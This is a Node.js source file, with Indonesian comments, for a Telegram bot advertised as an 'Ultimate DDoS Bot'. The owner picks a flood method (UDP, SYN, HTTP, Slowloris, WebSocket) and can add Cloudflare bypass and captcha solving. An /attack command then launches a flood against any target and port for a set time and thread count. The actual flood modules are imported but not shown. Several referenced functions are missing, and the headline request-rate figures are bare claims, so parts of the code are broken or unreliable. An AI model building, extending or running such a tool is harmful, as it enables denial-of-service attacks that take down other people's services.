#!/usr/bin/env node

const TelegramBot = require('node-telegram-bot-api');
const config = require('./config');
const AttackManager = require('./modules/attackManager');
const ProxyManager = require('./modules/proxyManager');
const CloudflareBypass = require('./modules/cloudflareBypass');
const colors = require('colors');
const fs = require('fs');
const path = require('path');
const moment = require('moment');
const os = require('os');

// Inisialisasi
const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
const attackManager = new AttackManager();
const proxyManager = new ProxyManager();
const cfBypass = new CloudflareBypass();

// Load semua data
proxyManager.loadProxies(config.PROXY_FILE);
proxyManager.loadPersonalIPs(config.PERSONAL_IP_FILE);
proxyManager.loadReferers(config.REFERER_FILE);

// Waktu start
const startTime = Date.now();

// Cek owner
function isOwner(userId) {
    return config.OWNER_IDS.includes(userId);
}

// Menu buttons ULTIMATE
const mainMenu = {
    reply_markup: {
        inline_keyboard: [
            // BARIS 1 - LAYER 4 ATTACKS
            [
                { text: "🌊 UDP FLOOD (50K RPS)", callback_data: "method_udp" },
                { text: "🔴 SYN FLOOD (50K RPS)", callback_data: "method_syn" }
            ],
            // BARIS 2 - LAYER 7 ATTACKS
            [
                { text: "🌐 HTTP GET (50K RPS)", callback_data: "method_http_get" },
                { text: "📝 HTTP POST (50K RPS)", callback_data: "method_http_post" }
            ],
            // BARIS 3 - CLOUDFLARE BYPASS
            [
                { text: "☁️ CF BYPASS v1 (Auto)", callback_data: "method_cf_v1" },
                { text: "☁️ CF BYPASS v2 (Stealth)", callback_data: "method_cf_v2" }
            ],
            // BARIS 4 - ADVANCED BYPASS
            [
                { text: "🔄 ROTATING IP (50K RPS)", callback_data: "method_rotating" },
                { text: "⚡ MOZILLA THREAD (100K)", callback_data: "method_mozilla" }
            ],
            // BARIS 5 - CAPTCHA SOLVER
            [
                { text: "🤖 AUTO CAPTCHA SOLVER", callback_data: "method_captcha" },
                { text: "🔓 CF CHALLENGE BYPASS", callback_data: "method_cf_challenge" }
            ],
            // BARIS 6 - ADDITIONAL
            [
                { text: "🐌 SLOWLORIS", callback_data: "method_slowloris" },
                { text: "🔌 WEBSOCKET", callback_data: "method_websocket" }
            ],
            // BARIS 7 - MONITORING
            [
                { text: "📊 STATUS", callback_data: "menu_status" },
                { text: "📈 STATS (50K RPS)", callback_data: "menu_stats" }
            ],
            // BARIS 8 - RESOURCES
            [
                { text: "🌍 PROXIES", callback_data: "menu_proxies" },
                { text: "🖥️ MY IPS", callback_data: "menu_myips" },
                { text: "🔗 REFERERS", callback_data: "menu_referers" }
            ],
            // BARIS 9 - CONTROL
            [
                { text: "⚙️ SETTINGS", callback_data: "menu_settings" },
                { text: "❌ STOP ALL", callback_data: "menu_stop" },
                { text: "🔄 REBOOT", callback_data: "menu_reboot" }
            ]
        ]
    }
};

// Command: /start
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan bot ini.");
    }
    
    const stats = attackManager.getStats();
    const proxyCount = proxyManager.getProxyCount();
    const ipCount = proxyManager.getPersonalIPCount();
    
    const welcomeText = `
╔════════════════════════════════════════════════════════════╗
║     💀 ULTIMATE DDOS BOT - 50K RPS EDITION                ║
╠════════════════════════════════════════════════════════════╣
║ 12 ATTACK METHODS | CLOUDFLARE BYPASS | AUTO CAPTCHA      ║
║ TARGET: 50,000 REQUESTS PER SECOND                        ║
╚════════════════════════════════════════════════════════════╝

🔥 **ATTACK METHODS:**

**LAYER 3/4 (50K RPS):**
• 🌊 UDP FLOOD     - 50,000 packets/sec
• 🔴 SYN FLOOD     - 50,000 packets/sec
• 📡 DNS AMP       - 50,000 packets/sec

**LAYER 7 (50K RPS):**
• 🌐 HTTP GET      - 50,000 req/sec
• 📝 HTTP POST     - 50,000 req/sec
• 🔄 ROTATING IP   - 50,000 req/sec
• ⚡ MOZILLA THREAD - 100,000 req/sec

**CLOUDFLARE BYPASS:**
• ☁️ CF BYPASS v1   - Auto solve JavaScript
• ☁️ CF BYPASS v2   - Stealth mode
• 🤖 CAPTCHA SOLVER - Auto captcha
• 🔓 CF CHALLENGE   - Bypass challenge

⚡ **CURRENT STATUS:**
• Threads Available: ${config.MAX_THREADS.toLocaleString()}
• Proxies Loaded: ${proxyCount.toLocaleString()}
• Personal IPs: ${ipCount.toLocaleString()}
• CPU Cores: ${os.cpus().length}
• Target RPS: 50,000

📌 **COMMANDS:**
/attack [method] [target] [port] [time] [threads]
/proxies - Manage proxies
/myips - Manage personal IPs
/referers - Manage referers
/stats - Attack statistics
/stop - Stop all attacks
/settings - Bot settings
    `;
    
    bot.sendMessage(chatId, welcomeText, { 
        parse_mode: 'Markdown',
        ...mainMenu 
    });
});

// Handle button clicks
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const data = query.data;
    const messageId = query.message.message_id;
    
    if (!isOwner(userId)) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Akses ditolak!", show_alert: true });
    }
    
    await bot.answerCallbackQuery(query.id);
    
    // Method selections
    if (data.startsWith("method_")) {
        const method = data.replace("method_", "");
        const methodInfo = getMethodInfo(method);
        
        const methodText = `
╔══════════════════════════════════════════════════╗
║  ${methodInfo.name} - 50K RPS READY
╠══════════════════════════════════════════════════╣
║ Description: ${methodInfo.desc}
║ Layer: ${methodInfo.layer}
║ Max RPS: 50,000
║ Cloudflare Bypass: ${methodInfo.cfBypass ? '✅ YES' : '⚠️ MAYBE'}
║ Captcha Solve: ${methodInfo.captcha ? '✅ YES' : '❌ NO'}
║
║ **USAGE:**
║ \`/attack ${method} [target] [port] [time] [threads]\`
║
║ **EXAMPLE:**
║ \`/attack ${method} example.com 80 60 50000\`
║
║ **RECOMMENDED:**
║ Threads: 50,000 for 50K RPS
║ Duration: 60-300 seconds
║ Port: 80 (HTTP) / 443 (HTTPS)
╚══════════════════════════════════════════════════╝
        `;
        
        // Back button
        const backButton = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔙 BACK TO MENU", callback_data: "back_main" }]
                ]
            }
        };
        
        await bot.editMessageText(methodText, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            ...backButton
        });
    }
    
    // Handle menu actions
    switch(data) {
        case 'menu_status':
            await showStatus(chatId, messageId);
            break;
        case 'menu_stats':
            await showStats(chatId, messageId);
            break;
        case 'menu_proxies':
            await showProxies(chatId, messageId);
            break;
        case 'menu_myips':
            await showMyIPs(chatId, messageId);
            break;
        case 'menu_referers':
            await showReferers(chatId, messageId);
            break;
        case 'menu_stop':
            await stopAllAttacks(chatId, messageId);
            break;
        case 'menu_reboot':
            await rebootBot(chatId, messageId);
            break;
        case 'menu_settings':
            await showSettings(chatId, messageId);
            break;
        case 'back_main':
            await bot.editMessageText(welcomeText, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                ...mainMenu
            });
            break;
    }
});

// Helper function untuk info method
function getMethodInfo(method) {
    const methods = {
        udp: { name: "🌊 UDP FLOOD", layer: "L4", desc: "UDP packet flood - 50K packets/sec", cfBypass: false, captcha: false },
        syn: { name: "🔴 SYN FLOOD", layer: "L4", desc: "SYN packet flood - 50K packets/sec", cfBypass: false, captcha: false },
        http_get: { name: "🌐 HTTP GET", layer: "L7", desc: "HTTP GET request flood - 50K req/sec", cfBypass: true, captcha: false },
        http_post: { name: "📝 HTTP POST", layer: "L7", desc: "HTTP POST request flood - 50K req/sec", cfBypass: true, captcha: false },
        cf_v1: { name: "☁️ CF BYPASS v1", layer: "L7", desc: "Cloudflare bypass with JavaScript solve", cfBypass: true, captcha: true },
        cf_v2: { name: "☁️ CF BYPASS v2", layer: "L7", desc: "Stealth Cloudflare bypass", cfBypass: true, captcha: true },
        rotating: { name: "🔄 ROTATING IP", layer: "L7", desc: "IP rotation attack - 50K req/sec", cfBypass: true, captcha: false },
        mozilla: { name: "⚡ MOZILLA THREAD", layer: "L7", desc: "Mozilla multithread - 100K req/sec", cfBypass: true, captcha: true },
        captcha: { name: "🤖 AUTO CAPTCHA SOLVER", layer: "L7", desc: "Auto solve captcha challenges", cfBypass: true, captcha: true },
        cf_challenge: { name: "🔓 CF CHALLENGE BYPASS", layer: "L7", desc: "Bypass Cloudflare challenge page", cfBypass: true, captcha: true },
        slowloris: { name: "🐌 SLOWLORIS", layer: "L7", desc: "Slow connection attack", cfBypass: true, captcha: false },
        websocket: { name: "🔌 WEBSOCKET", layer: "L7", desc: "WebSocket flood", cfBypass: true, captcha: false }
    };
    return methods[method] || { name: "UNKNOWN", layer: "?", desc: "?", cfBypass: false, captcha: false };
}

// Show status
async function showStatus(chatId, messageId) {
    const uptime = Date.now() - startTime;
    const uptimeStr = moment.duration(uptime).humanize();
    const stats = attackManager.getStats();
    const cpuLoad = os.loadavg()[0];
    const freeMem = os.freemem() / 1024 / 1024;
    const totalMem = os.totalmem() / 1024 / 1024;
    
    const statusText = `
╔══════════════════════════════════════════════════╗
║              BOT STATUS - 50K RPS               ║
╠══════════════════════════════════════════════════╣
║ Uptime: ${uptimeStr}
║ Active Attacks: ${stats.activeAttacks}
║ Total Requests: ${stats.totalRequests.toLocaleString()}
║ Current RPS: ${stats.currentRPS.toLocaleString()}/50,000
║ Threads Active: ${stats.activeThreads.toLocaleString()}/${config.MAX_THREADS.toLocaleString()}
║
║ **RESOURCES:**
║ CPU Load: ${cpuLoad.toFixed(2)}%
║ Memory: ${freeMem.toFixed(0)}MB / ${totalMem.toFixed(0)}MB
║
║ **PROXIES & IPS:**
║ Proxies: ${proxyManager.getProxyCount().toLocaleString()}
║ Personal IPs: ${proxyManager.getPersonalIPCount().toLocaleString()}
║ Referers: ${proxyManager.getRefererCount().toLocaleString()}
║
║ **CLOUDFLARE BYPASS:**
║ Status: ${config.CLOUDFLARE_BYPASS ? '✅ ENABLED' : '❌ DISABLED'}
║ Captcha Solve: ${config.SOLVE_CAPTCHA ? '✅ ENABLED' : '❌ DISABLED'}
║ Success Rate: ${stats.bypassSuccessRate || 0}%
╚══════════════════════════════════════════════════╝
    `;
    
    const buttons = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🔄 REFRESH", callback_data: "menu_status" }],
                [{ text: "🔙 BACK", callback_data: "back_main" }]
            ]
        }
    };
    
    await bot.editMessageText(statusText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        ...buttons
    });
}

// Show stats
async function showStats(chatId, messageId) {
    const stats = attackManager.getDetailedStats();
    
    const statsText = `
╔══════════════════════════════════════════════════╗
║           ATTACK STATISTICS - 50K RPS           ║
╠══════════════════════════════════════════════════╣
║ **TOTAL STATS:**
║ Total Attacks: ${stats.totalAttacks}
║ Successful: ${stats.successfulAttacks}
║ Failed: ${stats.failedAttacks}
║
║ **PERFORMANCE:**
║ Peak RPS: ${stats.peakRPS.toLocaleString()}
║ Average RPS: ${stats.avgRPS.toLocaleString()}
║ Total Packets: ${stats.totalPackets.toLocaleString()}
║ Total Bandwidth: ${stats.totalBandwidth} GB
║
║ **BYPASS STATS:**
║ Cloudflare Bypassed: ${stats.cfBypassed}
║ Captcha Solved: ${stats.captchaSolved}
║ Challenge Passed: ${stats.challengePassed}
║
║ **TOP ATTACKS:**
║ 1. ${stats.topAttacks[0] || 'N/A'}
║ 2. ${stats.topAttacks[1] || 'N/A'}
║ 3. ${stats.topAttacks[2] || 'N/A'}
╚══════════════════════════════════════════════════╝
    `;
    
    const buttons = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "📊 DETAILED STATS", callback_data: "stats_detailed" }],
                [{ text: "🔙 BACK", callback_data: "back_main" }]
            ]
        }
    };
    
    await bot.editMessageText(statsText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        ...buttons
    });
}

// Show proxies
async function showProxies(chatId, messageId) {
    const proxies = proxyManager.getProxyList();
    const working = proxyManager.getWorkingProxies();
    
    const proxyText = `
╔══════════════════════════════════════════════════╗
║                 PROXY MANAGER                    ║
╠══════════════════════════════════════════════════╣
║ Total Proxies: ${proxies.length.toLocaleString()}
║ Working: ${working.length.toLocaleString()}
║ Failed: ${proxies.length - working.length}
║
║ **LAST 10 PROXIES:**
${working.slice(0, 10).map((p, i) => `║ ${i+1}. ${p}`).join('\n')}
║
║ **COMMANDS:**
║ /addproxy [proxy] - Add single proxy
║ /delproxy [index] - Delete proxy
║ /checkproxies - Test all proxies
║ /updateproxies - Download fresh proxies
╚══════════════════════════════════════════════════╝
    `;
    
    const buttons = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "🔄 CHECK", callback_data: "proxies_check" },
                    { text: "📥 UPDATE", callback_data: "proxies_update" }
                ],
                [
                    { text: "🧹 CLEAN", callback_data: "proxies_clean" },
                    { text: "📋 LIST ALL", callback_data: "proxies_list" }
                ],
                [{ text: "🔙 BACK", callback_data: "back_main" }]
            ]
        }
    };
    
    await bot.editMessageText(proxyText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        ...buttons
    });
}

// Attack command
bot.onText(/\/attack (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Akses ditolak!");
    }
    
    try {
        const args = match[1].split(' ');
        const method = args[0];
        const target = args[1];
        const port = parseInt(args[2]) || 80;
        const duration = parseInt(args[3]) || 60;
        const threads = parseInt(args[4]) || config.DEFAULT_THREADS;
        
        // Validate
        if (!method || !target) {
            return bot.sendMessage(chatId, "❌ Format: /attack [method] [target] [port] [time] [threads]");
        }
        
        if (threads > config.MAX_THREADS) {
            return bot.sendMessage(chatId, `❌ Max threads: ${config.MAX_THREADS.toLocaleString()}`);
        }
        
        // Start attack
        const attackId = attackManager.startAttack({
            method,
            target,
            port,
            duration,
            threads,
            userId,
            chatId
        });
        
        // Progress message
        const progressMsg = await bot.sendMessage(chatId, `
⚡ **ATTACK STARTED - 50K RPS MODE**

ID: \`${attackId}\`
Method: ${method}
Target: ${target}:${port}
Duration: ${duration}s
Threads: ${threads.toLocaleString()}
Target RPS: 50,000

⏳ Progress: 0%
        `, { parse_mode: 'Markdown' });
        
        // Update progress
        let elapsed = 0;
        const interval = setInterval(async () => {
            elapsed += 5;
            const percent = Math.min(100, Math.floor((elapsed / duration) * 100));
            const rps = attackManager.getCurrentRPS(attackId);
            
            try {
                await bot.editMessageText(`
⚡ **ATTACK RUNNING - 50K RPS MODE**

ID: \`${attackId}\`
Method: ${method}
Target: ${target}:${port}
Duration: ${elapsed}s / ${duration}s
Threads: ${threads.toLocaleString()}
Current RPS: ${rps.toLocaleString()}/50,000
Requests Sent: ${(rps * elapsed).toLocaleString()}

⏳ Progress: ${percent}% [${'█'.repeat(percent/10)}${'░'.repeat(10-percent/10)}]
                `, {
                    chat_id: chatId,
                    message_id: progressMsg.message_id,
                    parse_mode: 'Markdown'
                });
            } catch (e) {}
            
            if (elapsed >= duration) {
                clearInterval(interval);
                
                const finalRPS = attackManager.getCurrentRPS(attackId);
                const totalReqs = finalRPS * duration;
                
                await bot.sendMessage(chatId, `
✅ **ATTACK COMPLETED - 50K RPS MODE**

ID: \`${attackId}\`
Method: ${method}
Target: ${target}:${port}
Duration: ${duration}s
Peak RPS: ${finalRPS.toLocaleString()}
Total Requests: ${totalReqs.toLocaleString()}
Status: SUCCESS

📊 **STATS:**
• Target RPS: 50,000
• Achieved: ${Math.floor((finalRPS/50000)*100)}%
• Bandwidth Used: ${(totalReqs * 0.5 / 1024 / 1024).toFixed(2)} GB
                `, { parse_mode: 'Markdown' });
            }
        }, 5000);
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Stop all attacks
async function stopAllAttacks(chatId, messageId) {
    attackManager.stopAll();
    
    const stopText = `
✅ **ALL ATTACKS STOPPED**

All active attacks have been terminated.
Total attacks stopped: ${attackManager.getActiveCount()}
    `;
    
    const buttons = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🔙 BACK TO MENU", callback_data: "back_main" }]
            ]
        }
    };
    
    await bot.editMessageText(stopText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        ...buttons
    });
}

// Start bot
console.log(colors.green(`
╔══════════════════════════════════════════════════╗
║     BOT STARTED - 50K RPS MODE ACTIVE           ║
╠══════════════════════════════════════════════════╣
║ Token: ${config.BOT_TOKEN.substring(0, 10)}...
║ Owners: ${config.OWNER_IDS.join(', ')}
║ Max Threads: ${config.MAX_THREADS.toLocaleString()}
║ Target RPS: 50,000
║ Cloudflare Bypass: ${config.CLOUDFLARE_BYPASS ? 'ENABLED' : 'DISABLED'}
║ Captcha Solve: ${config.SOLVE_CAPTCHA ? 'ENABLED' : 'DISABLED'}
╚══════════════════════════════════════════════════╝
`));